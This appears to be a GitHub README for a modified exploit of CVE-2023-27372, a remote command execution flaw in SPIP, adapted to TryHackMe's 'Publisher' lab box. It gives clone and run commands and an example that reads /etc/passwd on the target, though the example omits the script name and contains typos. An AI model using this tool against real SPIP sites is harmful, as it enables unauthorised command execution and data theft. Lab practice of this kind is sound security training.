# About Publisher--THM >>
Modify exploit to Publisher BOX on TryHackMe

Origianl exploit 
https://github.com/nuts7/CVE-2023-27372

# Install and usage >>

```
git clone https://github.com/TheSysRat/Publisher--THM
cd Publisher--THM
python3 expolit.py -u <url>/spip -c <command> -v

Example:
python3 http://publisher.thm/spip -c 'cat /etc/passwd' -v
```
